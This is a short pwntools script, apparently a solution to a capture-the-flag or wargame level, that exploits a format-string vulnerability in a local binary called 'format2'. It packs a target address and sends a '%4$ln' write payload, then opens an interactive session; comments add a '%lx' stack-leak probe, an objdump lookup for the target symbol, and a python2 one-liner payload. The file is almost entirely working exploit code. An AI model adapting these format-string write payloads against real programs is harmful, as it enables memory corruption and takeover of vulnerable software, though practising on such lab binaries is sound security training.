from pwn import * 

BIN = "./format2"

target = 0x0804c028


def exploit():
	payload = p32(target) + b"%60d" + b"%4$ln"
	io.sendline(payload)
	io.interactive()

io = process(BIN)
exploit()


# ABCDEFGH|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx
#objdump -t format2 |grep target 000000000060105c

# python2 -c 'print "\x5c\x10\x60\x00\x00\x00\x00\x00" + "%6$ln"' | ./format